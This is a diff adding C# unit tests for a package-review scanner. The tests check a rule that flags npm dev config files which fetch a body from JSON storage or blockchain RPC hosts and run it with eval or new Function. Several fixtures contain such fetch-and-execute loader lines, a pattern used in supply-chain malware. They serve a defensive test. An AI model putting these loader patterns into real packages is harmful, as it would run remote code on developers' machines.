@@ -3107,4 +3107,38 @@ public sealed class PackageReviewTests : IDisposable
         Assert.Contains(r.Findings, f => f is { Rule: "package/comment-filler", Path: "package/index.js" });
         Assert.Contains(r.Findings, f => f is { Rule: "package/string-array", Path: "package/lib.js" });
     }
+
+    private PackageReport ConfigPackage(string name, string config, string file = "tailwind.config.js") =>
+        Review(Tgz(name,
+            ("package/package.json", """{"name":"styled","version":"1.0.0","main":"index.js"}"""),
+            ("package/index.js", "module.exports = 1;"),
+            ("package/" + file, config)));
+
+    [Fact]
+    public void A_dev_config_that_evals_a_body_fetched_from_a_JSON_storage_host_is_noteworthy()
+    {
+        var r = ConfigPackage("a-1.0.0.tgz", "module.exports = { content: [] };\nfetch('https://api.jsonbin.io/v3/b/abc').then(r => r.text()).then(t => { eval(t); });");
+        Assert.Contains(r.Findings, f => f is { Rule: "package/code-store-eval", Level: "noteworthy", Path: "package/tailwind.config.js" });
+    }
+
+    [Fact]
+    public void A_dev_config_that_evals_a_response_from_a_chain_RPC_host_is_noteworthy()
+    {
+        var r = ConfigPackage("b-1.0.0.tgz", "const res = await fetch('https://api.trongrid.io/v1/accounts/x/transactions');\nconst body = await res.text();\nnew Function(body)();\nmodule.exports = {};", "vite.config.js");
+        Assert.Contains(r.Findings, f => f is { Rule: "package/code-store-eval", Level: "noteworthy", Path: "package/vite.config.js" });
+    }
+
+    [Fact]
+    public void A_stock_dev_config_and_hosts_without_eval_report_nothing_noteworthy()
+    {
+        Assert.DoesNotContain(ConfigPackage("c-1.0.0.tgz", "module.exports = { content: ['./src/**/*.{js,ts}'], theme: { extend: {} }, plugins: [] };").Findings, f => f.Level == "noteworthy");
+        Assert.DoesNotContain(ConfigPackage("d-1.0.0.tgz", "module.exports = { rpc: 'https://bsc-dataseed1.binance.org', store: 'https://api.jsonbin.io/v3/b/abc' };").Findings, f => f.Level == "noteworthy");
+        Assert.DoesNotContain(ConfigPackage("e-1.0.0.tgz", "fetch('https://api.npoint.io/abc').then(r => r.json()).then(j => console.log(JSON.parse(JSON.stringify(j))));\nmodule.exports = {};", ".eslintrc.js").Findings, f => f.Rule == "package/code-store-eval");
+    }
+
+    [Fact]
+    public void An_eval_beside_an_unlisted_host_is_not_a_code_store_finding()
+    {
+        Assert.DoesNotContain(ConfigPackage("f-1.0.0.tgz", "fetch('https://example.com/x').then(r => r.text()).then(t => { eval(t); });\nmodule.exports = {};", "postcss.config.js").Findings, f => f.Rule == "package/code-store-eval");
+    }
 }
